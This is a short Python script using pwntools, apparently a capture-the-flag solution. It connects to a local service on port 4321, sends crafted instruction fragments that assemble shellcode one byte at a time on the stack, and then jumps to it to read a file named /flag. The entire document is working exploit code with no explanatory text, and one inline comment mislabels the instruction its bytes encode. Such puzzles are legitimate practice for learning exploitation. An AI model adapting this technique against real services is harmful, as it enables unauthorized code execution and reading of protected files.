#!/usr/bin/python
from pwn import *

shellcode = asm(shellcraft.cat('/flag',2)+shellcraft.exit())
p = remote('127.0.0.1',4321)
p.send('\x89\xe7\xeb\x0c') #xor edi,esp
for s in shellcode:
    p.send('\xb0%s\xeb\x0c' % s) #mov al,(byte)
    p.send('\xaa\x90\xeb\x0c') #stosb; nop
p.send('\xff\xe4\xeb\x0c') #jmp esp
p.shutdown("out")
p.interactive()
